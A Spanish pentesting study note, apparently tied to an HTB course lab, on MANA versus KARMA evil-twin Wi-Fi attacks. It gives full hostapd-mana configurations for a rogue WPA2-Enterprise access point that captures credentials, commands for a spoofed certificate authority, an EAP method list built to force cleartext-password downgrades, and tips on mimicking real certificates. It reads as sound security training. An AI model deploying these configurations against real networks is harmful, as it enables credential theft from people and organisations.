---
tags:
  - Wi-Fi/Evil-Twin
  - Pentesting/Explotacion
Descripción: "Suplantar la red que el cliente busca: en qué se diferencia MANA de KARMA, por qué el KARMA clásico ya casi no funciona y cómo montar el AP falso sin los errores del manual"
Fecha de actualización: 2026-08-04
Nota previa: "[[06 - WPA3-SAE - fuerza bruta online y sus límites]]"
Nota siguiente: "[[08 - WPA2-Enterprise, evil twin y robo de credenciales]]"
Area: "[[Wi-Fi corporativo.base|Wi-Fi corporativo]]"
---
---

Cuando el reconocimiento encuentra un cliente buscando una red **que ya no existe** —el caso de `StarLight-INT` en el escenario guía—, no hay AP que atacar: hay un dispositivo dispuesto a conectarse a quien responda con ese nombre. <mark style="background: #ADCCFFA6;">Ese es el hueco que explotan KARMA y MANA</mark>.

# KARMA y MANA no son lo mismo

HTB describe `enable_mana` como *"MANA mode, which is the KARMA beacon attack"*. Son técnicas emparentadas pero distintas, y la diferencia importa porque explica por qué una funciona hoy y la otra casi no:

| Técnica | Qué hace | Estado |
| ------- | -------- | ------ |
| **KARMA** (2004) | Responde a *probe requests* **dirigidas** con "esa red soy yo" | Muy degradado |
| **MANA** (2014, SensePost) | Construye la PNL de cada cliente y responde de forma dirigida | Vigente |
| **MANA *loud*** | Reemite **todas** las redes conocidas a **todos** los dispositivos | Vigente, ruidoso |

La configuración de `hostapd-mana` lo documenta con precisión: `mana_loud=0` significa *"networks are broadcast at the specific devices looking for them"*, y `mana_loud=1`, *"networks are advertised to all devices"*. <mark style="background: #FFB8EBA6;">El valor por defecto es `0`</mark>, no `1` como sugiere el ejemplo de HTB.

> [!important]+ Por qué el KARMA clásico dejó de funcionar
> KARMA dependía de que los dispositivos preguntaran activamente por cada red conocida. Desde ~2015, iOS, Android y Windows pasaron a **escaneo pasivo** y **MAC aleatoria**: escuchan beacons en vez de preguntar, y cuando preguntan lo hacen con direcciones localmente administradas.
>
> El propio `hostapd-mana` lo reconoce en sus comentarios, y `mana_loud` existe precisamente como respuesta: si el cliente ya no pregunta, se le anuncian todas las redes conocidas y se espera a que reconozca una suya. <mark style="background: #FFB86CA6;">El coste es el ruido</mark>: un AP anunciando decenas de SSID es exactamente lo que busca la alerta `KARMAOUI` de Kismet.
>
> Lo que **sí** sigue funcionando es el caso dirigido de este escenario: se conoce el SSID exacto que el cliente busca, así que no hace falta modo *loud* ni adivinar nada.

# Paso 1: probar con PSK

Con el SSID conocido, lo primero es descartar que la red buscada fuera WPA2-PSK:

```config
interface=wlan1
driver=nl80211
ssid=StarLight-INT
hw_mode=g
channel=1

wpa=2
wpa_key_mgmt=WPA-PSK
rsn_pairwise=CCMP
wpa_passphrase=cualquiercosa

enable_mana=1
mana_loud=0
```

```shell-session
$ sudo macchanger -r wlan1          # tras haber suplantado otro BSSID, randomizar
$ sudo hostapd-mana hostapd.conf
```

La lectura del resultado es la clave del paso:

| Salida | Significado |
| ------ | ----------- |
| `AP-STA-POSSIBLE-PSK-MISMATCH` | El cliente **sí** usa PSK → medio handshake capturado |
| Sólo `IEEE 802.11: authenticated`, sin más | El cliente **no** negocia PSK → probar Enterprise |

<mark style="background: #8000E1A6;">Esa ausencia de mensaje es el diagnóstico</mark>: el cliente se autentica a nivel 802.11 (que en `Open System` siempre tiene éxito) pero no llega al 4-way handshake, porque espera 802.1X.

# Paso 2: certificados para el AP Enterprise

Aquí es donde el manual de HTB falla. Sus comandos `openssl` **no producen un par de certificados usable**:

> [!warning]+ Tres errores encadenados en los comandos de HTB
> 1. Genera `ca-key.pem` con `genpkey` y acto seguido ejecuta `openssl req -x509 -keyout ca-key.pem`, que **sobrescribe** esa clave. El primer comando sobra.
> 2. Genera `server-key.pem` **sin cifrar** y luego le pasa `-passin pass:...`, que no aplica a una clave sin contraseña.
> 3. Declara `private_key_passwd=whatever` en `hostapd.conf` para una clave que no tiene contraseña.
>
> El resultado es una configuración que <mark style="background: #FF5582A6;">falla al arrancar o usa una CA distinta de la que firmó el certificado</mark>.

La secuencia correcta son tres pasos:

```shell-session
# 1) CA: clave y certificado autofirmado en un solo comando
$ openssl req -x509 -newkey rsa:2048 -keyout ca-key.pem -out ca.pem -days 365 \
    -passout pass:ClaveDeLaCA \
    -subj "/C=ES/O=StarLight Hospitals/CN=StarLight Root CA"

# 2) Clave del servidor SIN cifrar (-noenc; en OpenSSL 1.x era -nodes) y su CSR
$ openssl req -newkey rsa:2048 -noenc -keyout server-key.pem -out server.csr \
    -subj "/C=ES/O=StarLight Hospitals/CN=radius.starlight.local" \
    -addext "subjectAltName=DNS:radius.starlight.local"

# 3) Firmar el CSR con la CA
$ openssl x509 -req -in server.csr -CA ca.pem -CAkey ca-key.pem -CAcreateserial \
    -out server-cert.pem -days 365 -passin pass:ClaveDeLaCA \
    -copy_extensions copyall
```

Con la clave del servidor sin cifrar, `private_key_passwd` **se omite** en la configuración.

> [!info]+ El certificado creíble importa más que el certificado válido
> Un cliente que valida correctamente (`ca_cert` + `domain_suffix_match`) rechazará cualquier CA propia, por bien construida que esté. Pero un cliente que **sólo** avisa al usuario mostrará el `CN` y la organización. <mark style="background: #FFB86CA6;">Copiar el `Subject` y el `Issuer` del certificado real</mark> —visibles en la captura del EAP legítimo— multiplica la probabilidad de que alguien pulse "confiar". Ese detalle de oficio es el que HTB omite al poner `Example` y `cyberz@h4x0r.lulz` en los campos.

# Paso 3: AP Enterprise con captura de credenciales

```config
interface=wlan1
ssid=StarLight-INT
channel=1
hw_mode=g

wpa=2
wpa_key_mgmt=WPA-EAP
rsn_pairwise=CCMP
ieee8021x=1
auth_algs=3

eap_server=1
eap_user_file=/opt/certs/hostapd.eap_user
ca_cert=/opt/certs/ca.pem
server_cert=/opt/certs/server-cert.pem
private_key=/opt/certs/server-key.pem

enable_mana=1
mana_loud=0
mana_wpe=1
mana_credout=/opt/certs/credenciales.creds
mana_eapsuccess=1
```

| Opción | Función (según la documentación de `hostapd-mana`) |
| ------ | -------------------------------------------------- |
| `mana_wpe=1` | Activa la captura de credenciales EAP |
| `mana_credout` | Fichero donde se escriben: retos MSCHAPv2, TTLS-PAP/CHAP en claro |
| `mana_eapsuccess=1` | *"Allow clients to connect with incorrect credentials"* — deja entrar aunque no se validen |
| `mana_macacl` | Extiende las ACL de MAC a las *probe responses* (útil para no tocar dispositivos fuera de alcance) |

> [!warning]+ `wpa=3` no es WPA3
> HTB escribe `wpa=3` en esta configuración. En `hostapd` ese campo es un **mapa de bits**: `1` = WPA original (TKIP), `2` = RSN/WPA2, `3` = **ambos a la vez**. Poner `3` habilita WPA1 con TKIP, justo lo contrario de lo que sugiere el nombre. Para un AP Enterprise moderno, `wpa=2`.

El fichero `hostapd.eap_user` controla qué métodos se negocian, y es donde se fuerza el *downgrade*:

```text
*               PEAP,TTLS,TLS,MD5,GTC
"t"             TTLS-PAP,GTC,TTLS-CHAP,TTLS-MSCHAP,TTLS-MSCHAPV2,MD5   "password"  [2]
```

La primera línea anuncia los métodos de fase 1; la segunda, los de fase 2, ordenados **de más débil a más fuerte** para que el cliente acepte el primero que soporte. `GTC` y `TTLS-PAP` entregan la contraseña **en claro**; `MSCHAPv2`, un reto crackeable offline.

# El resultado y su lectura

```text
MANA EAP Identity Phase 0: STARLIGHT\jdorian
MANA EAP GTC | STARLIGHT\jdorian:P4ssw0rd123456789
```

Dos hallazgos distintos salen de ahí, y conviene separarlos en el informe:

1. **El cliente aceptó un servidor RADIUS desconocido** — falta `ca_cert`/`domain_suffix_match`. Es el fallo grave, y afecta a toda la flota.
2. **El cliente aceptó negociar GTC** — falta restringir métodos EAP. Convierte un reto crackeable en una contraseña en claro.

El desarrollo del ataque Enterprise con herramienta dedicada, y las contramedidas concretas del suplicante, están en [[08 - WPA2-Enterprise, evil twin y robo de credenciales]].

# Estado de la herramienta

`sensepost/hostapd-mana` tiene el repositorio **activo** (commits en agosto de 2026) pero su última versión etiquetada es la **2.6.5, de enero de 2019**, basada en un `hostapd` antiguo. Funciona, pero no soporta lo que `hostapd` moderno sí: SAE, OWE, 6 GHz. Para un AP falso WPA3 hay que usar `hostapd` de serie, y para captura de credenciales EAP, `hostapd-mana` o [[08 - WPA2-Enterprise, evil twin y robo de credenciales|EAPHammer]], que lo empaqueta con mejor ergonomía.
